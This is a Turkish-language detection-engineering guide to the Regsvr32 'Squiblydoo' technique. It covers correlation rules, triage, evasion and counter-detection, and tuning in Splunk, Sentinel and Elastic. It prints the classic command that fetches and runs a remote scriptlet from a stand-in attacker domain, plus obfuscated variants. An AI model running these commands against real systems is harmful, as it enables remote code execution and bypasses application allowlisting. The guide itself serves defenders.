# Regsvr32 (Squiblydoo) — Tespit

## 1. Özet: saldırı + naif tespit

Regsvr32.exe, Windows'un imzalı, Microsoft'a ait, her sistemde bulunan bir ikilisidir (LOLBIN). Asıl işi COM sunucularını (DLL'leri) kaydetmek/silmektir: `DllRegisterServer` ve `DllUnregisterServer` fonksiyonlarını çağırır. Squiblydoo tekniğinin (Casey Smith / subTee, ~2016) bulduğu şey şu: Regsvr32'nin `/i` anahtarı bir DLL yerine `scrobj.dll` (Script Component runtime) üzerinden bir COM scriptlet çalıştırabiliyor ve bu scriptlet **uzaktan bir URL'den** çekilebiliyor. Klasik komut:

```
regsvr32.exe /s /n /u /i:http://saldirgan[.]com/payload.sct scrobj.dll
```

`/s` sessiz, `/u` unregister (paradoksal ama `DllUnregisterServer` çağrılıyor ve orada da kod çalışıyor), `/i` install parametresiyle URL geçiyor. Sonuç: imzalı bir Microsoft ikilisi, diskte hiç PE dosyası bırakmadan, uzaktaki bir `.sct` içindeki JScript/VBScript'i indirir ve çalıştırır. Bu yüzden hem AppLocker/WDAC atlatma (imzalı, güvenilir yol) hem de proxy execution (T1218.010) sınıfına girer.

Naif tespit herkesin bildiği yerdir: process oluşturma logunda (Sysmon Event ID 1 / Security 4688) `regsvr32.exe` komut satırında `scrobj.dll` veya `/i:http` ya da `/i:https` ara. Ek olarak Regsvr32'nin ağa çıkması (Sysmon EID 3) ya da DNS sorgusu üretmesi (yukarıdaki `DNS Query Request By Regsvr32.EXE` kuralı, EID 22) klasik ikinci sinyaldir. "Regsvr32 + URL + scrobj = kötü" — evet, ilk gün bunu yazarsın. Ama saha bunu yıllar önce çözdü; artık kimse ham Squiblydoo'yu bu haliyle atmıyor. Değer, bu kuralın **neden yetmediğini** bilmekte başlar.

## 2. Naif tespit neden yetmez

Birinci sorun: **komut satırı imzası kırılgan.** `/i:http` araması, saldırganın URL'i tırnak, boşluk, ortam değişkeni veya alternatif şema ile gizlemesiyle kolayca kaçar. `regsvr32 /s /i:"http://…"`, `/i:HtTp://`, hatta `/i:\\unc\share\payload.sct` (SMB üzerinden, "http" hiç geçmez) ya da tamamen yerel bir `.sct` dosyası (`/i:C:\Users\Public\a.sct scrobj.dll`) — bu son varyantta ağ da yok, "http" de yok, ama scrobj.dll hâlâ scriptlet çalıştırıyor. `scrobj.dll` string'ini arayan kural yereli yakalar ama URL arayan kural kaçırır. İki kuralı ayrı yazan ekipler birinde kör kalır.

İkinci sorun: **scrobj.dll her zaman komut satırında görünmez.** Saldırgan `.sct` yerine gerçek bir COM scriptlet'i kayıtlı bir CLSID üzerinden tetiklerse ya da regsvr32'yi bir DLL yükleyip `DllRegisterServer` içinde kötü kod çalıştıracak şekilde kullanırsa (klasik DLL kaydı, scrobj yok), `scrobj.dll` anahtar kelimesi hiç geçmez. O zaman komut satırı `regsvr32 /s evil.dll` gibi tamamen masum görünür ve bu **gerçekten meşru** kullanımdan ayırt edilemez.

Üçüncü ve en can alıcı sorun: **komut satırı loglaması varsayılan kapalı.** Birçok ortamda Security 4688 event'inde `CommandLine` alanı yoktur — "Include command line in process creation events" GPO'su açılmamıştır. Sysmon yoksa, elinde sadece `regsvr32.exe başladı` bilgisi vardır, argüman yoktur. Bu durumda naif kuralın dayandığı tüm sinyal (komut satırı) yok demektir. Ekip Kibana'da kural yeşil görünür ama besleyen alan boştur; sessiz bir kör nokta.

Dördüncü sorun: **false positive selleri.** Regsvr32 kurumsal ortamda sürekli çalışır — yazılım kurulumları (MSI), SCCM/Intune dağıtımları, yazıcı sürücüleri, Office/OneDrive kurulum sonrası COM kaydı, hatta bazı EDR ajanları kendi DLL'lerini kaydeder. `regsvr32.exe` process'i günde binlerce kez normal koşar. Eğer kuralın yalnızca "regsvr32 ağa çıktı" (EID 3) ise, bazı meşru yazılımlar lisans/telemetri için gerçekten dışarı bağlanır ve seni gürültüye boğar. Sadece görüntüyü/ağ olayını arayan kaba kural, analistlerin "bu kuralı susturun" dediği kural olur — ve susturulan kural bir gün gerçek saldırıyı da yutar.

Özetle naif tespit üç yönden kör: alan (komut satırı) yoksa görmez, string kaçırılırsa görmez, ve tek sinyale dayandığı için ya gürültüden boğulur ya da eşiği yükseltip gerçeği kaçırır. Asıl iş, tek zayıf sinyali **korelasyonla** yüksek güvene çevirmektir.

## 3. Korelasyon zinciri (asıl değer)

Regsvr32'nin ağa çıkması tek başına orta-güvenli bir sinyaldir; meşru olabilir. Onu yüksek-güvenli ihlal göstergesine çeviren şey, **atipik ebeveyn + atipik davranış + zamansal yakınlık** üçlüsüdür. Somut bir zincir:

**Aşama A — Şüpheli köken (parent):** `regsvr32.exe`'nin ebeveyni normalde `services.exe`, `msiexec.exe`, `svchost.exe` ya da bir kurulum sürecidir. Ama ebeveyn `winword.exe`, `excel.exe`, `outlook.exe`, `mshta.exe`, `wscript.exe` ya da `cmd.exe/powershell.exe` ise ve bunlar da kullanıcı oturumunda interaktif değil bir dokümandan tetiklenmişse — bu, phishing makro → LOLBIN zincirinin klasik ayak izidir. Tek başına Office'ten regsvr32 çağrısı bile nadir; loglayıp temel çizgi (baseline) çıkar.

**Aşama B — Ağ / DNS anomalisi:** Aşama A'dan **saniyeler içinde** aynı `regsvr32.exe` process'i (aynı ProcessGuid, Sysmon'da bu altın anahtar) bir DNS sorgusu (EID 22) ya da dış bağlantı (EID 3) üretir. Yukarıdaki `DNS Query Request By Regsvr32.EXE` kuralı burada devreye girer — ama tek başına orta seviyedir. A ile B'yi aynı ProcessGuid üzerinden birleştirdiğinde: "Office'ten doğmuş regsvr32, 2 saniye içinde daha önce hiç görülmemiş bir domain'e DNS sorgusu attı" — bu artık orta değil, yüksek güven.

**Aşama C — Takip yükü / yanal işaret:** Gerçek ihlalde Squiblydoo yalnızca ilk adımdır. Scriptlet genelde ikinci aşamayı indirir: bellek içi bir loader, bir `create_remote_thread` (yukarıdaki iki kural — PowerShell/uncommon source image'den rundll32/regsvr32'ye enjeksiyon), ya da bir C2 beacon. Yani kısa süre içinde **aynı host'ta** ya `powershell.exe`'nin olağandışı bir hedefe uzak thread açması (EID 8, `Rare Remote Thread Creation` / `Remote Thread Creation Via PowerShell In Uncommon Target`) ya da `scripting app → clr.dll yüklemesi` (`DotNet CLR DLL Loaded By Scripting Applications`, EID 7) görünür. Zincir tamamlanır: **A (Office→regsvr32) + B (regsvr32→yeni domain DNS, aynı GUID) + C (aynı host'ta 5 dk içinde remote thread veya CLR yüklemesi) = gerçek ihlal.**

Bu üç aşama ayrı ayrı orta/düşük sinyaldir ve her biri tek başına meşru olabilir. Ama bir `ComputerName` üstünde, dar bir zaman penceresinde (örneğin 5 dakika) art arda gelmeleri, tesadüf olasılığını neredeyse sıfırlar. Google'da "regsvr32 detection" araması sana A'yı ayrı, B'yi ayrı, C'yi ayrı verir; hiçbir tek sayfa bu üçünü aynı ProcessGuid ve zaman penceresiyle **bağlamaz.** Korelasyonu kuran SIEM/EDR mantığı burada değer üretir.

Pratik SIEM ifadesi (Splunk/tstats mantığıyla, kabaca): regsvr32'nin process oluşturma olaylarını al, `ParentImage` Office/scripting ailesindeyse işaretle → aynı `process_guid` ile 60 sn içindeki DNS/Network olaylarına join et, domain'i sık görülenler listesiyle karşılaştır → aynı `dest_host` üstünde ±300 sn içinde `create_remote_thread` veya `image_load clr.dll` var mı diye ikinci join. Üç koşul da tutuyorsa skoru "critical" yap. Tek koşul tutuyorsa "notable" olarak triage kuyruğuna at, otomatik alarm verme.

Bir başka güçlü korelasyon: **kaynak imzalama + hedef anomali.** Ham Squiblydoo'da `.sct` dosyası içeriği JScript/VBScript'tir; `scrobj.dll` bunu çalıştırmak için `jscript.dll` / `vbscript.dll` yükler (EID 7). "regsvr32 process'i jscript.dll yükledi ve aynı process ağa çıktı" birleşimi, komut satırı hiç loglanmasa bile Squiblydoo'yu image_load + network korelasyonuyla yakalar — komut satırından bağımsız, dolayısıyla komut satırı gizlemeye dayanıklı bir tespit yolu. Bu, bölüm 5'teki kaçınma tartışmasının da temeli.

## 4. False positive gerçeği ve triage yargısı

Gerçek ortamda bu alarmı meşru üreten şeyler bellidir ve kıdemli analist bunları ezbere bilir:

- **SCCM / ConfigMgr / Intune dağıtımları:** Yazılım paketleri kurulumun parçası olarak DLL kaydeder. Ebeveyn genelde `ccmexec.exe`, `TSManager.exe` ya da `msiexec.exe` olur, `SYSTEM` bağlamında koşar. Bu meşru zincirin imzası: SYSTEM hesabı, bilinen dağıtım penceresi, ebeveyn bir yönetim ajanı, ve genelde komut satırında yerel bir DLL yolu (URL değil).
- **Yedekleme / AV / EDR yazılımları:** Kurulum ve güncelleme sırasında COM bileşeni kaydederler; bazıları lisans doğrulama için dışarı da bağlanır (EID 3 tetikler). Kurumsal yazılım tedarikçisinin domain'i tanınır.
- **Vulnerability scanner (Nessus, Qualys ajanları):** Uzaktan komut çalıştırma ve credentialed tarama sırasında LOLBIN'leri tetikleyebilir; kaynak IP tarayıcının kendisidir. Tarama penceresini bilmek false positive'in yarısını eler.
- **Yönetici scriptleri ve login script'leri:** Bazı eski kurumsal login GPO'ları regsvr32 ile ActiveX/OCX kaydeder. Ebeveyn `userinit.exe` / `gpscript.exe`, tetiklenme oturum açılışında ve toplu.
- **Yazıcı/tarayıcı sürücüleri, Office eklentileri:** Kullanıcı bir eklenti kurunca meşru regsvr32 koşar.

Kıdemli analistin gerçek/gürültü ayrımı **tek bir alana değil, alanların birlikteliğine** bakar. İlk sorduğu sorular sırayla:

1. **Ebeveyn ne?** SYSTEM altında `msiexec/ccmexec/services` ise güçlü meşruiyet karinesi. `winword/outlook/mshta/wscript/cmd` ise güçlü şüphe. Bu tek soru vakaların çoğunu ayırır.
2. **Hedef DLL/argüman ne?** Yerel bir yol mu (`C:\Program Files\...`) yoksa `scrobj.dll` + URL mü? URL varsa domain'in yaşı, reputasyonu, kurumda daha önce görülüp görülmediği.
3. **Kullanıcı ve zaman bağlamı:** SYSTEM/servis hesabı mı, interaktif kullanıcı mı? Dağıtım penceresinde mi, gecenin 3'ünde tek bir kullanıcıda mı?
4. **Yayılım:** Aynı imza aynı anda 500 makinede mi (dağıtım/güncelleme kokar) yoksa tek makinede tek seferlik mi (hedefli saldırı kokar)? Filo genelinde eşzamanlı patlama neredeyse her zaman meşru bir yazılım dağıtımıdır.

Çoklu alarm patladığında kıdemli analist **önce en dar ve en yüksek-güvenli sinyale** bakar: bölüm 3'teki C aşaması (remote thread / CLR injection) ya da "Office ebeveyn + yeni domain" birleşimi. Ham "regsvr32 ağa çıktı" alarmına en son bakar çünkü o en gürültülüsüdür. Mantık şu: gürültülü alarm meşrusa sessizce kapat, ama gürültülü alarma bağlı bir "nadir" alarm varsa (aynı host'ta remote thread), o zaman zinciri geriye doğru izle. Yani triage tek tek alarm değil, **host bazında olay zinciri** okur — "bu makinede son 10 dakikada ne oldu" sorusu, "bu alarm ne diyor" sorusundan önce gelir.

Somut bir yargı örneği: Sabah 09:15'te 300 makinede regsvr32 network alarmı → hepsinin ebeveyni SYSCM, hepsi aynı iç dağıtım sunucusuna gidiyor → kapat, dokümante et, tuning için baseline'a ekle. Aynı gün 02:40'ta tek bir makinede regsvr32, ebeveyni `excel.exe`, daha önce görülmemiş bir `.top` TLD domain'ine DNS, ve 90 saniye sonra aynı makinede `powershell.exe`'den `explorer.exe`'ye remote thread → bu düşük hacimli ama yüksek dar sinyal; hemen host'u izole et, hafıza al. Hacim ters orantılıdır: gerçek hedefli saldırı genelde **tek makinede, düşük gürültüde, gecenin bir saatinde** olur.

## 5. Kaçınma → karşı-tespit (derin kedi-fare)

Saldırgan naif tespiti bildiği için kural dokümanında yazmayan yollara başvurur. Her kaçınmaya ikinci-derece bir tespit vardır:

**Kaçınma 1 — Yerel scriptlet (URL yok):** Saldırgan `.sct` dosyasını önce diske indirir (ya da başka bir aşamada bırakır), sonra `regsvr32 /s /i:C:\Users\Public\log.sct scrobj.dll` çalıştırır. "http" araması kaçar, ağ olayı yok.
*Karşı-tespit:* Komut satırından bağımsız git — `regsvr32.exe`'nin `scrobj.dll` **image_load** etmesi (EID 7) artı ardından `jscript.dll`/`vbscript.dll` yüklemesi zaten anormaldir çünkü meşru DLL kaydı scrobj yüklemez. Ayrıca `.sct`/`.wsc` dosyasının diske yazılması (EID 11) + kısa süre sonra regsvr32'nin çalışması korelasyonu. Yani ağı değil, scrobj+scriptmotoru DLL yükleme desenini avla.

**Kaçınma 2 — Komut satırı gizleme:** `regsvr32  /s /i:h""ttp://…`, ortam değişkenleri, Unicode homoglyph, uzun boşluk doldurma. String tabanlı kural kaçar.
*Karşı-tespit:* Regex yerine davranış — regsvr32'nin **process başına dış ağ bağlantısı** (EID 3) zaten nadirdir; komut satırını hiç okumadan "regsvr32 + external IP + non-standard port veya yeni domain" yakalar. Ek olarak komut satırı uzunluğu/entropi anomalisi (aşırı uzun, yüksek entropili argüman) heuristik olarak işaretlenebilir.

**Kaçınma 3 — Alternatif LOLBIN'e geçiş:** Squiblydoo çok yandığı için saldırgan `rundll32`, `mshta`, `msiexec /i http://…`, `installutil`, `regasm/regsvcs`, ya da `odbcconf` gibi kuzenlere kayar. Yukarıdaki `Amsi.DLL Loaded Via LOLBIN Process` kuralının `odbcconf.exe`/`ExtExport.exe` içermesi tam da bu göçün izidir.
*Karşı-tespit:* Regsvr32'ye özel değil, **LOLBIN sınıfına** genelleştirilmiş tespit yaz: "imzalı sistem ikilisi + Office/script ebeveyn + dış ağ" deseni ikilinin adından bağımsız çalışır. Tek tek `regsvr32.sigma`, `rundll32.sigma` yazmak yerine ebeveyn-davranış korelasyonunu ortak kur; saldırgan LOLBIN değiştirdiğinde tespit ayakta kalır.

**Kaçınma 4 — "PowerShell without PowerShell" / AMSI atlatma:** Saldırgan Squiblydoo scriptlet'i içinde `System.Management.Automation.dll`'i doğrudan yükleyerek PowerShell motorunu `powershell.exe` süreci olmadan çalıştırır, böylece PowerShell script-block loglaması (EID 4104) hiç tetiklenmez. Yukarıdaki `Amsi.DLL Loaded Via LOLBIN Process` ve `DotNet CLR DLL Loaded By Scripting Applications` kuralları tam bu senaryoya karşı yazılmıştır.
*Karşı-tespit:* `image_load` telemetrisi (EID 7) burada altındır — `scrobj.dll`/`wscript.exe` gibi bir LOLBIN'in `clr.dll`, `System.Management.Automation.dll` ya da `amsi.dll` yüklemesi, komut satırı ve PowerShell logları tamamen sessiz olsa bile motoru ele verir. Not: `Amsi.DLL` kuralında `regsvr32.exe` yorum satırına alınmış çünkü regsvr32 meşru olarak da amsi.dll çağırıyor — bu, kör string tespitinin false positive tuzağına iyi bir örnek; bu yüzden regsvr32 için amsi.dll değil, `clr.dll`/scriptmotoru yüklemesine güvenilir.

**Kaçınma 5 — AMSI/ETW patch ve DLL unregister yolu:** Bellekte `amsi.dll` içindeki `AmsiScanBuffer`'ı yamalamak ya da `/u` (unregister) yolunu kullanarak farklı bir kod yoluna girmek.
*Karşı-tespit:* `/u` + `/i` + `scrobj` kombinasyonu meşru kullanımda neredeyse hiç birlikte görülmez; unregister ederken uzaktan scriptlet install etmek anlamsızdır, bu yüzden bu üçlü birliktelik yüksek güvenli imzadır. AMSI patch için ise EDR'nin `amsi.dll` bütünlük izlemesi ya da `NtProtectVirtualMemory` ile amsi.dll bölgesine RWX değişimi (behavioral) devreye girer.

**Kaçınma 6 — Ebeveyn maskeleme (parent spoofing):** Saldırgan `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` ile regsvr32'yi sahte bir ebeveynden (örneğin `explorer.exe` ya da `svchost.exe`) doğmuş gibi gösterir; böylece bölüm 3'teki A aşaması ("Office ebeveyn") kandırılır. Telemetride ParentImage masum görünür.
*Karşı-tespit:* Sysmon EID 1'deki `ParentProcessGuid` gerçek ebeveyni izler ama spoof edilmiş ise EID 1 ile EDR'nin çekirdek seviyesi ebeveyn-zinciri arasında **tutarsızlık** oluşur; bazı EDR'ler gerçek yaratıcı thread'i loglar. Ayrıca ebeveyn spoof edilse de A aşaması kaybolur ama B ve C (ağ + image_load + remote thread) korelasyonu ayakta kalır — bu yüzden zinciri tek bir aşamaya (ebeveyn) asla dayandırma; ağ ve image_load ayakları ebeveyn maskelemeye bağışıktır.

Kedi-fare özü: string tespitini davranış tespitine, tek-ikili tespitini sınıf tespitine, komut satırı bağımlılığını image_load/ağ bağımlılığına, tek-aşama bağımlılığını çok-aşama korelasyonuna taşıdıkça saldırganın kaçış alanı daralır. Her katman komut satırı gizlemeye, LOLBIN göçüne, log baskılamaya ya da ebeveyn maskelemeye karşı **bağımsız** bir yakalama noktası sağlar — kritik olan bağımsızlıktır: saldırgan bir katmanı kırdığında diğerleri hâlâ tetiklenir. Tek katmana yaslanan tespit, o katmanın atlatılmasıyla tamamen körelir.

## 6. SIEM / saha gerçeği

**Alan eşleme (field mapping) tuzakları.** Sigma'daki `create_remote_thread` kategorisi Sysmon EID 8'e denk gelir ama alan adları platformdan platforma değişir. Sysmon ham logunda `SourceImage`/`TargetImage` vardır; ama log bir normalizasyondan (ECS, CIM, ASIM) geçtiyse bu alanlar `process.executable` / `process.target.executable` (Elastic ECS) ya da `SourceImage` korunmuş ama `Image` başka anlama gelmiş olabilir. `Image|endswith` bir kuralda process'in kendisini, başka kategoride (image_load, EID 7) yükleyen process'i ifade eder — aynı alan adı iki farklı semantik. Kuralı taşırken kategoriyi (`logsource.category`) mutlaka doğrula; yoksa `DNS Query` kuralındaki `Image` (sorguyu yapan process) ile `create_remote_thread` kuralındaki `SourceImage`'i karıştırıp boş sonuç alırsın.

**Varsayılan loglanmayanlar — bu en büyük saha gerçeği.** Squiblydoo tespiti için kritik olan üç telemetri varsayılan olarak KAPALIDIR:

- **Komut satırı (Security 4688):** "Administrative Templates → System → Audit Process Creation → Include command line" GPO'su açık değilse `CommandLine` boştur. Sysmon EID 1 bunu her zaman verir — dolayısıyla Sysmon'suz ortamda komut satırına dayalı tüm Squiblydoo kuralları körelmiş demektir.
- **DNS sorgusu (Sysmon EID 22):** Sysmon config'inde `<DnsQuery>` bölümü etkin değilse `DNS Query Request By Regsvr32.EXE` kuralı hiç beslenmez. Windows'un kendi DNS-Client Operational logu ayrı ayrı açılmalıdır ve gürültülüdür.
- **Image load (Sysmon EID 7):** Bölüm 5'in bel kemiği olan `clr.dll`/`scrobj.dll`/`amsi.dll` yükleme tespitleri EID 7'ye bağlıdır. EID 7 varsayılan Sysmon config'lerinde çoğu zaman performans için kısıtlanır veya kapatılır (çok yüksek hacim). SwiftOnSecurity/Olaf config'lerinde image_load genelde dar bir allowlist ile açıktır — kritik DLL'leri (amsi, clr, scrobj, vbscript, jscript, System.Management.Automation) kapsadığından emin ol.

Yani "Sysmon config şart" cümlesi somuttur: EID 1 (komut satırı), 3 (ağ), 7 (image_load, kritik DLL'ler dahil), 8 (remote thread), 11 (dosya oluşturma, `.sct`), 22 (DNS) — bu altı olay açık değilse bu dokümandaki korelasyonların çoğu yazılamaz. Kural yazmadan önce telemetri envanterini doğrula; aksi halde yeşil ama boş kural üretirsin.

**Splunk vs Sentinel vs Elastic farkları.** Splunk'ta korelasyonu genelde `tstats` + `transaction`/`stats by process_guid` ile kurarsın; `process_guid` üzerinden multi-event join en temiz yol, ama `transaction` pahalıdır, büyük ortamda `stats earliest/latest by process_guid` tercih edilir. Zaman penceresi join'i için `| join` yerine `bin _time span=5m` + `stats` daha ölçeklenir. Sentinel'de (KQL) `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceImageLoadEvents` ayrı tablolardır (Defender XDR) ve `InitiatingProcessId`/`InitiatingProcessCreationTime` çifti Sysmon'un ProcessGuid'inin yerini tutar — join anahtarını bu çift üzerinden kur, tek başına PID yeniden kullanılır ve yanlış eşleşir. Elastic'te ECS ile `process.entity_id` (Sysmon ProcessGuid'in ECS karşılığı) altın anahtardır; EQL `sequence by process.entity_id with maxspan=5m` tam bu korelasyon için tasarlanmıştır ve bölüm 3'teki A→B→C zincirini tek sorguda ifade edebilir — üç platform içinde korelasyonu en doğal yazan EQL'dir.

**Tuning gerçeği.** Regsvr32 kuralı üretimde saf haliyle boğar. Gerçekçi tuning sırası: (1) ebeveyni SYSTEM + `msiexec/ccmexec/services/trustedinstaller` olanları çıkar — bu tek filtre gürültünün büyük kısmını alır; (2) kurumdaki yazılım dağıtım sunucularının domain/IP'lerini ve tanınan tedarikçi domain'lerini allowlist'e al, ama allowlist'i `ParentImage` koşuluyla birlikte kullan (yoksa saldırgan o domain'i taklit eder); (3) filo genelinde eşzamanlı patlamaları (aynı imza >N host, <M dakika) ayrı bir "muhtemel dağıtım" kovasına yönlendir, kritik alarmdan ayır; (4) baseline'ı periyodik yenile — yeni yazılım kurulumları yeni meşru regsvr32 desenleri getirir. Allowlist'i asla tek başına `dest_domain`'e dayandırma; her istisnayı en az bir davranışsal koşulla (ebeveyn, hesap bağlamı, yayılım) çiftle. Kıdemli detection engineer'ın kuralı: **istisna ne kadar genişse, onu dengeleyen davranışsal koşul o kadar dar olmalı.** Aksi halde tuning, saldırgana hazır bir kör nokta hediye eder.
